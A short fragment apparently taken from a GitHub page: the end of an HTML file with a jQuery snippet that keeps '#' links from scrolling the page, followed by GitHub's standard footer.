 // Makes sure that the href="#" attached to the <a> elements // don't scroll you back up the page. $('body').on('click', 'a[href="#"]', function(event) { event.preventDefault(); }); </script></body></html>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


